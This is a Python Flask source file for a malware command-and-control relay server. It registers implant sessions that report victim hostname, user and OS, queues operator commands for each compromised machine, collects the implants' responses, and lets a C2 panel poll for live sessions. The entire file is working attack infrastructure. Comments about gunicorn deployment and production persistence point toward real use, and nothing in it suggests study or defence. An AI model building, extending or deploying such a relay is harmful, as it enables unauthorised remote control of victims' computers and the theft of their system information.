# relay/relay_server.py (Definitive, with verbose and corrected logging)
from flask import Flask, request, jsonify
import time, threading

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024

# NOTE: These are in-memory stores. If the relay server restarts, all active session
# data, command queues, and pending responses will be lost. For a production-ready
# system, this state should be managed in a persistent store like Redis.
active_sessions = {}
command_queue = {}
response_queue = {}

# --- Threading Locks ---
session_lock = threading.Lock()
command_lock = threading.Lock()
response_lock = threading.Lock()

def process_results(session_id, c2_user, results):
    for result in results:
        if result.get("command") == "System Info":
            output = result.get("output", {})
            if output.get("status") == "success":
                new_data = output.get("data", {})
                with session_lock:
                    if c2_user in active_sessions and session_id in active_sessions[c2_user]:
                        active_sessions[c2_user][session_id]["metadata"].update(new_data)

@app.route('/implant/hello', methods=['POST'])
def handle_hello():
    try:
        data = request.json
        session_id = data.get("session_id")
        c2_user = data.get("c2_user")
    except: return "error: Invalid JSON", 400
    if not session_id or not c2_user: return "error: Missing session_id or c2_user", 400

    with session_lock:
        active_sessions.setdefault(c2_user, {})
        if session_id not in active_sessions[c2_user]:
            # FIX: Improved logging to be more descriptive.
            hostname = data.get("hostname", "Unknown Host")
            print(f"[RELAY] New session registered from {hostname} for user {c2_user}. (ID: {session_id})")
            metadata = {
                "hostname": data.get("hostname", "Resolving..."),
                "user": data.get("user", "Resolving..."),
                "os": data.get("os", "Resolving..."),
                "ip": "Resolving..."
            }
            active_sessions[c2_user][session_id] = {"metadata": metadata}
        active_sessions[c2_user][session_id]['last_seen'] = time.time()

    results = data.get("results", [])
    if results:
        process_results(session_id, c2_user, results)

    with command_lock:
        commands = command_queue.pop(session_id, [])

    return jsonify({"commands": commands})

@app.route('/c2/poll/<c2_user>', methods=['GET'])
def poll_for_updates(c2_user):
    live_threshold = time.time() - 40

    live_sessions = {}
    with session_lock:
        user_sessions = active_sessions.get(c2_user, {})
        for sid, data in user_sessions.items():
            if data.get("last_seen", 0) > live_threshold:
                live_sessions[sid] = data

    user_responses = []
    with response_lock:
        sessions_to_check = list(response_queue.keys())
        for session_id in sessions_to_check:
            # Ensure the session belongs to the polling user
            if session_id in active_sessions.get(c2_user, {}):
                 user_responses.extend(response_queue.pop(session_id, []))

    # FIX: Improved logging for polling requests.
    print(f"[RELAY] C2 panel for user '{c2_user}' is polling. Found {len(live_sessions)} live session(s).")
    return jsonify({
        "sessions": live_sessions,
        "responses": user_responses
    })

@app.route('/c2/task', methods=['POST'])
def handle_task():
    data = request.json
    session_id = data.get("session_id")
    command = data.get("command")
    if not session_id or not command:
        return jsonify({"status": "error", "message": "Missing session_id or command"}), 400
    with command_lock:
        command_queue.setdefault(session_id, []).append(command)
    print(f"[RELAY] Command queued for session {session_id}.")
    return jsonify({"status": "ok", "message": "Command queued."})

@app.route('/implant/response', methods=['POST'])
def handle_response():
    data = request.json
    session_id = data.get("session_id")
    if not session_id:
        return jsonify({"status": "error", "message": "Missing session_id"}), 400
    with response_lock:
        response_queue.setdefault(session_id, []).append(data)
    return jsonify({"status": "ok"})

@app.route('/ping', methods=['GET'])
def handle_ping():
    return "pong", 200

# The __main__ block is for local testing; gunicorn will run `app` directly.
if __name__ == '__main__':
    print("Starting Flask development server for local testing...")
    app.run(host='0.0.0.0', port=5001)